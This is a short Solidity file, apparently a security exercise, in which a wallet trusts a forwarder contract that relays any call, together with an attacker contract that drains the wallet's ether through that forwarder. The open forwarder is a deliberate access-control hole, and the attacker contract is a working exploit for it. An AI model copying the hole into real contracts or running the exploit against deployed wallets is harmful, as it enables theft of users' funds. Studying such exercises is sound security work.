// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success, ) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success, ) = a.call(data);
        require(success, "forward failed");
    }
}

contract Attacker {
    Forwarder forwarder;
    Wallet wallet;

    constructor(Forwarder forwarder_, Wallet wallet_) {
        forwarder = forwarder_;
        wallet = wallet_;
    }

    receive() external payable {}

    function attack() public {
        forwarder.functionCall(
            address(wallet),
            abi.encodeWithSelector(
                Wallet.sendEther.selector,
                address(this),
                1 ether
            )
        );
    }
}
